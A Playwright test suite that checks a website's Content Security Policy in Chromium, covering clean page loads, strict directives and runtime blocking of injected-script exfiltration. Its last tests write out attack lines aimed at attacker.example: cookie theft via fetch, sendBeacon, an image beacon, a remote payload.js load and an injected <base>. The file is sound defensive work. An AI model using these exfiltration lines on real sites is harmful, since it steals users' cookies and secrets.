// ============================================================================
// Content Security Policy — browser-enforced verification.
// ============================================================================
//
//   cd tests/csp && npm install && npx playwright test
//
// A CSP that has never been exercised in a browser is a production outage
// waiting to happen: every blocked font, stylesheet, map tile or API call is
// invisible until a real user hits it. So this suite loads EVERY page that
// deploy-prod.yml publishes, in real Chromium, with the shipped policy in
// force, and fails on any CSP violation.
//
// It asserts three separate things, and all three matter:
//
//   1. NOTHING LEGITIMATE IS BROKEN — zero securitypolicyviolation events and
//      zero CSP console errors across all 17 published pages.
//   2. THE POLICY STILL HAS TEETH — the directives that actually contain an
//      XSS (connect-src, img-src, script-src, object-src, base-uri,
//      form-action) are present and contain no wildcard or blanket source. A
//      CSP that passes (1) by allowing everything is worthless.
//   3. THE CONTAINMENT WORKS — the exact exfiltration primitives an injected
//      payload would use are attempted at runtime and must be REFUSED by the
//      browser, not merely absent from the policy text.
//
// Supabase is never actually contacted: requests to it are fulfilled locally.
// Note that CSP is enforced in the renderer BEFORE a request is issued, so a
// route handler can never mask a CSP block — a blocked call simply never
// arrives, and surfaces as a violation event instead.

const { test, expect } = require('@playwright/test');
const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '..', '..');
const PRUNED = ['agent-login.html', 'dashboard.html', 'edit-listing.html', 'add-property.html', 'marketing-os.html'];

const PAGES = fs.readdirSync(ROOT)
  .filter((f) => f.endsWith('.html'))
  .filter((f) => !PRUNED.includes(f))
  .sort();

// Everything a page might reach for that we do not want to actually fetch in a
// test: the real Supabase project, Google Fonts, CDNs, tiles, map/video frames.
// Each is fulfilled with a minimal valid body so the page proceeds normally.
async function stubExternals(page) {
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
    'base64'
  );
  await page.route('**://*.supabase.co/**', (r) =>
    r.fulfill({ status: 200, contentType: 'application/json', body: '[]' })
  );
  await page.route('**://fonts.googleapis.com/**', (r) =>
    r.fulfill({ status: 200, contentType: 'text/css', body: '' })
  );
  await page.route('**://fonts.gstatic.com/**', (r) => r.fulfill({ status: 200, body: '' }));
  await page.route('**://cdn.jsdelivr.net/**', (r) =>
    // A stand-in for supabase-js: the pages only need `supabase.createClient`
    // to exist so their boot code runs far enough to load everything else.
    r.fulfill({
      status: 200,
      contentType: 'application/javascript',
      body: 'window.supabase={createClient:function(){return{auth:{getUser:async()=>({data:{user:null}}),getSession:async()=>({data:{session:null}}),onAuthStateChange(){},signOut:async()=>({}),mfa:{getAuthenticatorAssuranceLevel:async()=>({data:{currentLevel:"aal1"}}),listFactors:async()=>({data:{totp:[]}})}},from(){return this},select(){return this},eq(){return this},order(){return this},limit(){return this},then(r){return Promise.resolve({data:[],error:null}).then(r)}}}};',
    })
  );
  await page.route('**://unpkg.com/**', (r) => {
    const css = r.request().url().endsWith('.css');
    return r.fulfill({
      status: 200,
      contentType: css ? 'text/css' : 'application/javascript',
      body: css ? '' : 'window.L={map:()=>({setView:()=>({})}),tileLayer:()=>({addTo:()=>{}}),marker:()=>({addTo:()=>({bindPopup:()=>{}})}),icon:()=>({})};',
    });
  });
  await page.route('**://*.tile.openstreetmap.org/**', (r) =>
    r.fulfill({ status: 200, contentType: 'image/png', body: png })
  );
  await page.route('**://maps.google.com/**', (r) =>
    r.fulfill({ status: 200, contentType: 'text/html', body: '<html></html>' })
  );
  await page.route('**://*.youtube.com/**', (r) =>
    r.fulfill({ status: 200, contentType: 'text/html', body: '<html></html>' })
  );
  await page.route('**://pintag-cyrora.github.io/**', (r) =>
    r.fulfill({ status: 200, contentType: 'image/png', body: png })
  );
  await page.route('**://img.pintag.io/**', (r) =>
    r.fulfill({ status: 200, contentType: 'image/png', body: png })
  );
}

// Collect violations from BOTH channels: the securitypolicyviolation DOM event
// (authoritative, structured) and console errors (catches the cases where the
// event does not fire, e.g. a meta-policy parse warning).
function collectViolations(page, sink) {
  page.on('console', (msg) => {
    const t = msg.text();
    if (/Content Security Policy|Refused to (load|execute|connect|apply|frame)/i.test(t)) {
      sink.push({ kind: 'console', text: t });
    }
  });
  return page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations.push({
        directive: e.effectiveDirective || e.violatedDirective,
        blocked: e.blockedURI,
        source: e.sourceFile,
      });
    });
  });
}

test.describe('every published page loads cleanly under the shipped CSP', () => {
  for (const file of PAGES) {
    test(`${file} — no CSP violations`, async ({ page }) => {
      const violations = [];
      await collectViolations(page, violations);
      await stubExternals(page);

      await page.goto('/' + file, { waitUntil: 'load' });
      // Let deferred boot work (fonts, map init, async fetches) settle.
      await page.waitForTimeout(900);

      const fromEvents = await page.evaluate(() => window.__cspViolations || []);
      const all = [...violations, ...fromEvents];

      expect(
        all,
        `CSP blocked something ${file} legitimately needs:\n` +
          all.map((v) => '  ' + JSON.stringify(v)).join('\n')
      ).toEqual([]);
    });
  }
});

test.describe('the policy itself still has teeth', () => {
  // A policy that passes the suite above by permitting everything would be
  // worse than none — it would look like protection while providing none.
  const CONTAINING = ['script-src', 'connect-src', 'img-src', 'object-src', 'base-uri', 'form-action', 'default-src'];

  test('every containing directive is present and free of blanket sources', () => {
    const html = fs.readFileSync(path.join(ROOT, 'listing.html'), 'utf8');
    const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
    expect(m, 'listing.html must carry a CSP meta tag').not.toBeNull();
    const csp = m[1];

    for (const d of CONTAINING) {
      expect(csp, `${d} must be present`).toContain(d + ' ');
    }

    // No directive may use a blanket source. `https:` or `*` in connect-src or
    // img-src would re-open the exfiltration channels the CSP exists to close.
    for (const directive of csp.split(';').map((s) => s.trim()).filter(Boolean)) {
      const [name, ...values] = directive.split(/\s+/);
      for (const v of values) {
        expect(v, `${name} must not use the blanket source "${v}"`).not.toBe('*');
        expect(v, `${name} must not use the blanket source "${v}"`).not.toBe('https:');
        expect(v, `${name} must not use the blanket source "${v}"`).not.toBe('http:');
        expect(v, `${name} must not use the blanket source "${v}"`).not.toBe('data:*');
      }
    }

    // Supabase origins must be pinned exactly. `https://*.supabase.co` would
    // let an attacker exfiltrate to a Supabase project they created themselves.
    expect(csp, 'Supabase origins must be exact hosts, never a wildcard').not.toContain('*.supabase.co');

    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("form-action 'self'");
  });

  test('every published page carries the identical policy', () => {
    const policies = new Map();
    for (const f of PAGES) {
      const html = fs.readFileSync(path.join(ROOT, f), 'utf8');
      const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
      expect(m, `${f} is published but carries no CSP`).not.toBeNull();
      policies.set(f, m[1]);
    }
    const distinct = new Set(policies.values());
    expect(
      [...distinct].length,
      'all published pages must share one policy (run `node scripts/apply-csp.mjs`)'
    ).toBe(1);
  });
});

test.describe('the containment actually works at runtime', () => {
  // The point of the CSP, given that 'unsafe-inline' keeps injected script
  // RUNNING, is that the script cannot get anything OUT. These tests perform
  // the exact exfiltration attempts an F-01/F-02 payload would make and require
  // the browser to refuse them.
  test('injected script cannot exfiltrate to an attacker host', async ({ page }) => {
    const violations = [];
    await collectViolations(page, violations);
    await stubExternals(page);
    await page.goto('/listing.html', { waitUntil: 'load' });

    const result = await page.evaluate(async () => {
      const out = { fetch: 'not-blocked', image: 'not-blocked', script: 'not-blocked' };
      // 1. fetch() — the classic cookie/token exfiltration.
      try { await fetch('https://attacker.example/steal?c=' + document.cookie); }
      catch (e) { out.fetch = 'blocked'; }
      // 2. sendBeacon — survives page unload, so a favourite for exfiltration.
      //    Its RETURN VALUE is not a usable signal: Chromium returns true as
      //    soon as the beacon is queued and enforces connect-src afterwards, so
      //    a blocked beacon still reports true. The authoritative signal is the
      //    securitypolicyviolation event, asserted separately below.
      try { navigator.sendBeacon('https://attacker.example/b', 'x'); } catch (e) { /* ignore */ }
      // 3. Image beacon — the channel that survives a strict connect-src alone.
      out.image = await new Promise((res) => {
        const i = new Image();
        i.onerror = () => res('blocked');
        i.onload = () => res('not-blocked');
        i.src = 'https://attacker.example/p.gif?d=secret';
        setTimeout(() => res('blocked'), 700);
      });
      // 4. Loading a remote payload.
      out.script = await new Promise((res) => {
        const s = document.createElement('script');
        s.onerror = () => res('blocked');
        s.onload = () => res('not-blocked');
        s.src = 'https://attacker.example/payload.js';
        document.head.appendChild(s);
        setTimeout(() => res('blocked'), 700);
      });
      return out;
    });

    expect(result.fetch, 'fetch() to an attacker host must be refused by connect-src').toBe('blocked');
    expect(result.image, 'image-beacon exfiltration must be refused by img-src').toBe('blocked');
    expect(result.script, 'loading a remote payload must be refused by script-src').toBe('blocked');

    // And the attempts must have been reported as violations, not silently
    // failing for some unrelated reason (e.g. DNS).
    // The attempts must have been reported as CSP violations, not merely have
    // failed for some unrelated reason (DNS, offline). Chromium reports the
    // most SPECIFIC directive it enforced, so a blocked <script> element
    // surfaces as `script-src-elem` rather than `script-src` — match the family
    // rather than the exact string.
    const seen = await page.evaluate(() => window.__cspViolations || []);
    const directives = new Set(seen.map((v) => v.directive));
    const sawFamily = (base) => [...directives].some((d) => d === base || d.startsWith(base + '-'));

    expect(sawFamily('connect-src'), 'a connect-src violation should have been recorded').toBe(true);
    expect(sawFamily('img-src'), 'an img-src violation should have been recorded').toBe(true);
    expect(sawFamily('script-src'),
      `a script-src violation should have been recorded (saw: ${[...directives].join(', ')})`).toBe(true);

    // sendBeacon specifically: its return value lies (see above), so assert the
    // browser actually refused the beacon's destination.
    const beaconBlocked = seen.some(
      (v) => v.directive === 'connect-src' && String(v.blocked).includes('attacker.example')
    );
    expect(beaconBlocked, 'connect-src must refuse the sendBeacon destination too').toBe(true);
  });

  test('injected markup cannot repoint relative URLs with <base>', async ({ page }) => {
    await stubExternals(page);
    await page.goto('/listing.html', { waitUntil: 'load' });
    const blocked = await page.evaluate(() => {
      const b = document.createElement('base');
      b.href = 'https://attacker.example/';
      document.head.appendChild(b);
      // base-uri 'self' makes the browser ignore the injected element.
      return !document.baseURI.startsWith('https://attacker.example');
    });
    expect(blocked, "base-uri 'self' must neutralise an injected <base>").toBe(true);
  });
});
